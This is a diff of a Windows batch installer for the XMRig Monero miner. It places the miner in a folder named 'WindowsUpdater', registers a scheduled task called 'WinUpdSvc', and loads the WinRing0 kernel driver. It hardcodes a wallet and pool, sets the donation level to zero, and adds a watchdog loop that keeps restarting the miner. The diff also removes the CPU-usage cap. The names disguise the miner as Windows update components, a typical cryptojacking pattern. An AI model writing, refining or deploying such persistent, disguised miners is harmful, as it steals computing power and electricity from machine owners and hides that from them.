@@ -1,11 +1,11 @@
 @echo off
 REM Force the window to be visible
-title Monero Miner Setup - High Mid-End PC
+title Monero Miner Setup - High-End PC
 color 0A
 
 REM ====================================================================
-REM Ultimate Monero Miner - High Mid-End Edition
-REM Optimized for 6-core CPUs with 12-16GB RAM (e.g., Intel i5-10400)
+REM Ultimate Monero Miner - High-End Edition (MSR Fixed, Enhanced)
+REM Optimized for modern multi-core CPUs with 16GB+ RAM
 REM Installs to C:\ProgramData\WindowsUpdater as requested
 REM ====================================================================
 setlocal enableextensions enabledelayedexpansion
@@ -19,7 +19,7 @@ set "SRC=%~dp0miner_src"
 set "DEST=C:\ProgramData\WindowsUpdater"
 set "TASK_NAME=WinUpdSvc"
 set "WALLET=49MJ7AMP3xbB4U2V4QVBFDCJyVDnDjouyV5WwSMVqxQo7L2o9FYtTiD2ALwbK2BNnhFw8rxHZUgH23WkDXBgKyLYC61SAon"
-set "POOL=gulf.moneroocean.stream:10032"
+set "POOL=gulf.moneroocean.stream:10128"
 set "LOG_FILE=%DEST%\miner.log"
 set "GITHUB_API=https://api.github.com/repos/xmrig/xmrig/releases/latest"
 
@@ -40,27 +40,24 @@ echo [✔] Running with admin privileges.
 echo [✔] Running with admin privileges. >> "%temp%\miner_debug.log"
 
 echo ===============================
-echo Starting Monero Miner on High Mid-End PC
+echo Starting Monero Miner on High-End PC
 echo ===============================
 
 REM === Debug Pause ===
 echo [*] Initial setup complete. Press any key to continue...
 pause
 
-REM === Clean Up Existing Task and MSR Driver ===
-echo [*] Cleaning up existing scheduled task and MSR driver (if any)...
-echo [*] Cleaning up existing scheduled task and MSR driver (if any)... >> "%temp%\miner_debug.log"
-taskkill /IM xmrig.exe /F >nul 2>&1
-schtasks /delete /tn "%TASK_NAME%" /f >nul 2>&1
-sc stop WinRing0_1_2_0 >nul 2>&1
-sc delete WinRing0_1_2_0 >nul 2>&1
-echo [✔] Scheduled task and MSR driver cleanup complete. >> "%temp%\miner_debug.log"
+REM === Clean Up Existing Task (If Any) ===
+echo [*] Cleaning up existing scheduled task (if any)...
+echo [*] Cleaning up existing scheduled task (if any)... >> "%temp%\miner_debug.log"
+schtasks /delete /tn "%TASK_NAME%" /f
+echo [✔] Scheduled task cleanup complete. >> "%temp%\miner_debug.log"
 
 REM === MSR Driver Installation (With Fallback) ===
 echo [*] Attempting to install MSR driver for performance boost...
 echo [*] Attempting to install MSR driver for performance boost... >> "%temp%\miner_debug.log"
-if exist "%SRC%\winring0x64.sys" (
-    sc create WinRing0_1_2_0 binPath= "%SRC%\winring0x64.sys" type= kernel start= demand
+if exist "%DEST%\miner_src\winring0x64.sys" (
+    sc create WinRing0_1_2_0 binPath= "%DEST%\miner_src\winring0x64.sys" type= kernel start= demand
     sc start WinRing0_1_2_0
     if '%errorlevel%' neq '0' (
         echo [!] Failed to install MSR driver. Continuing without it...
@@ -91,7 +88,7 @@ for /f "tokens=2 delims==" %%A in ('wmic cpu get NumberOfCores /value ^| find "=
     set /a "AFFINITY_MASK=(1<<%%A)-1"
 )
 if not defined AFFINITY_MASK (
-    set "AFFINITY_MASK=63"  REM Fallback for 6 cores
+    set "AFFINITY_MASK=255"  REM Fallback for 8 cores
 )
 echo [*] CPU Affinity set to: !AFFINITY_MASK! >> "%temp%\miner_debug.log"
 
@@ -130,7 +127,8 @@ REM === Install Files ===
 echo [*] Installing files to %DEST%...
 echo [*] Installing files to %DEST%... >> "%temp%\miner_debug.log"
 if not exist "%DEST%" mkdir "%DEST%"
-xcopy /Y /Q "%SRC%\*" "%DEST%\"
+if not exist "%DEST%\miner_src" mkdir "%DEST%\miner_src"
+xcopy /Y /Q "%SRC%\*" "%DEST%\miner_src\"
 if '%errorlevel%' equ '0' (
     echo [✔] Files installed successfully. >> "%temp%\miner_debug.log"
 ) else (
@@ -154,14 +152,13 @@ echo [*] Generating config file... >> "%temp%\miner_debug.log"
   echo     "memory-pool": true,
   echo     "asm": true,
   echo     "max-threads-hint": 85,
-  echo     "max-cpu-usage": 85,
   echo     "affinity": !AFFINITY_MASK!
   echo   },
   echo   "opencl": false,
   echo   "cuda": false,
   echo   "pools": [
   echo     {
-  echo       "url": "gulf.moneroocean.stream:10032",
+  echo       "url": "gulf.moneroocean.stream:10128",
   echo       "user": "%WALLET%",
   echo       "pass": "%COMPUTERNAME%",
   echo       "keepalive": true,
@@ -193,31 +190,30 @@ echo [*] Generating config file... >> "%temp%\miner_debug.log"
   echo       "weight": 40
   echo     }
   echo   ],
-  echo   "retry-time": 30,
-  echo   "retry-count": 5
+  echo   "retry-time": 10,
+  echo   "retry-count": 3
   echo }
 ) > "%DEST%\config.json"
 echo [✔] Config file generated. >> "%temp%\miner_debug.log"
 
-REM === Create Watchdog Script ===
+REM === Clean Watchdog ===
 echo [*] Creating watchdog script...
 echo [*] Creating watchdog script... >> "%temp%\miner_debug.log"
 (
   echo @echo off
-  echo set "WATCHDOG_LOG=%DEST%\watchdog.log"
   echo :loop
-  echo REM Count running xmrig.exe instances
-  echo for /f "tokens=1" %%i in ('tasklist /fi "IMAGENAME eq xmrig.exe" 2^>nul ^| find /c /i "xmrig.exe"') do set "XMRIG_COUNT=%%i"
-  echo if !XMRIG_COUNT! GTR 1 (
-  echo     echo [%date% %time%] Multiple xmrig.exe detected, killing extras... ^>^> "!WATCHDOG_LOG!"
-  echo     taskkill /IM xmrig.exe /F ^>nul 2^>^1
-  echo     ping 127.0.0.1 -n 16 ^>nul
+  echo REM Check if xmrig.exe is already running
+  echo tasklist /fi "IMAGENAME eq xmrig.exe" 2^>nul ^| find /i "xmrig.exe" ^>nul
+  echo if not errorlevel 1 (
+  echo     REM xmrig.exe is running, wait and check again
+  echo     ping 127.0.0.1 -n 11 ^>nul
+  echo     goto loop
   echo )
-  echo if !XMRIG_COUNT! EQU 0 (
-  echo     echo [%date% %time%] Starting xmrig.exe... ^>^> "!WATCHDOG_LOG!"
-  echo     start /min "" "%DEST%\xmrig.exe" --config="%DEST%\config.json" --randomx-1gb-pages --donate-level=0 --log-file="%LOG_FILE%" --print-time=60
-  echo )
-  echo ping 127.0.0.1 -n 16 ^>nul
+  echo REM xmrig.exe is not running, start it
+  echo start "" "%DEST%\miner_src\xmrig.exe" --config="%DEST%\config.json" --randomx-1gb-pages ^
+       --donate-level=0 --log-file="%LOG_FILE%" --print-time=60
+  echo REM Wait before checking again
+  echo ping 127.0.0.1 -n 11 ^>nul
   echo goto loop
 ) > "%DEST%\run_watchdog.bat"
 echo [✔] Watchdog script created. >> "%temp%\miner_debug.log"
@@ -258,7 +254,7 @@ if '%errorlevel%' equ '0' (
 REM Start the watchdog (minimized)
 start "" /min "%DEST%\run_watchdog.bat"
 
-echo [✔] Miner installed (optimized for high mid-end PC)
+echo [✔] Miner installed (optimized for high-end PC)
 echo CPU Affinity: !AFFINITY_MASK!
 echo Logs: %LOG_FILE%
 echo Uninstall: schtasks /delete /tn "%TASK_NAME%" /f ^>nul ^&^& rmdir /s /q "%DEST%"
